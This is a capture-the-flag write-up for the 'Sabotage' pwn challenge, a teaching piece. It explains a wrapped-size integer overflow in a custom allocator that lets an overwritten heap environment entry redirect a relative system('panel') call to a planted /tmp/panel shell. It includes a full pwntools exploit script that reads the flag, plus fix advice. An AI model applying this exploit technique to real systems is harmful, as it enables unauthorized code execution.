## Overview

Sabotage is a Medium pwn challenge from Cyber Apocalypse 2022. You get a fully-mitigated 64-bit binary (Full RELRO, canary, NX, PIE) with a custom heap allocator — and a `README.txt` that says the server "could not retrieve" two files, `panel` and `selfdestruct`. That is the whole hint: the program shells out to those names using **relative paths**. The exploit never smashes a return address; it corrupts *data* — an environment string on the heap — and lets the program's own `system()` do the work.

## The technique

The binary wraps `malloc` to keep an 8-byte size header:

```c
void *Malloc(size_t size) {
    void *p = malloc(size + 8);   // size + 8 can wrap
    *(size_t*)p = size;
    return p + 8;
}
```

Request `size = -1` (`0xffffffffffffffff`) and `size + 8` wraps to `7`: `malloc(7)` returns a tiny chunk, but the program reads the *original* (astronomically large) length into it. That is the [BadAlloc integer overflow (CWE-190)](https://nvd.nist.gov/vuln/detail/CVE-2021-3178) leading to an [unbounded heap-based buffer overflow (CWE-122)](https://cwe.mitre.org/data/definitions/122.html).

The interesting twist is what you do with the overflow. The vulnerable menu option ends with:

```c
setenv("ACCESS", ...);   // reallocates the environ array on the heap
system("panel");         // relative path -> PATH-searched
```

`system("panel")` runs `sh -c panel`, which looks up `panel` in `$PATH`. Both `$PATH` and the freshly-reallocated environment strings live on the writable heap, right where new chunks land — so the overflow can forge a `PATH=/tmp` entry, and a second menu option can plant a `/tmp/panel` for the search to find. This is a [relative-path / untrusted-search-path weakness (CWE-426)](https://cwe.mitre.org/data/definitions/426.html) escalated to code execution by the overflow.

## Solution

Save `solve.py`:

```python
from pwn import *
import os
os.chdir("files/challenge")            # interpreter is ./glibc/ld-...
io = remote(HOST, PORT)                # or process("./sabotage")

# Option 2: write /tmp/panel with a shell shebang (open(...,0777) makes it executable).
# "#!/bin/sh -s" -> the spawned shell reads its commands from stdin (our socket).
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b":", b"panel")
io.sendlineafter(b":", b"#!/bin/sh -s")

# Option 1: Malloc(-1) integer overflow -> tiny chunk -> unbounded read overflow.
# Overwrite the reallocated environment region with a forged PATH=/tmp entry.
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b":", b"-1")
io.sendlineafter(b":", b"A"*32 + b"PATH=/tmp\x00")

# system("panel") now finds /tmp/panel -> /bin/sh -s reading our stdin.
io.sendline(b"export PATH=/usr/bin:/bin:/usr/sbin:/sbin")   # restore PATH so cat/id resolve
io.sendline(b"/usr/bin/id")
io.sendline(b"/bin/cat flag.txt")
io.interactive()
```

```bash
python3 solve.py
```

A subtle gotcha: right after the shell spawns, `$PATH` is still `/tmp`, so `id` and `cat` aren't found until you restore `PATH` (or call them by absolute path). If a remote read comes back empty but `echo test` echoes, the shell *is* alive — it's just missing external binaries, not a broken exploit. The shell runs as the `ctf` user and `cat flag.txt` prints `HTB{...}`.

## Why it worked

Two weaknesses compound. First, the allocator's [unchecked `size + 8` arithmetic (CWE-190)](https://cwe.mitre.org/data/definitions/190.html) decouples the allocation size from the number of bytes later written, giving an unbounded overflow from a single read. Second, `system("panel")` trusts a `$PATH` that sits on the same writable heap as attacker data ([CWE-426](https://cwe.mitre.org/data/definitions/426.html)). Every modern mitigation — RELRO, stack canary, NX, PIE — is bypassed for free because the attack corrupts data, not control flow.

## Fix / defense

- **Check allocation arithmetic**: reject sizes where `size + N` would overflow (`if (size > SIZE_MAX - N) abort();` or `__builtin_add_overflow`), and never read more than the amount actually allocated.
- **Never call `system`/`exec*` with a relative program name.** Use an absolute path and reset `PATH` to a known-safe value before shelling out; prefer `execve`/`posix_spawn` so no shell `$PATH` lookup happens at all.
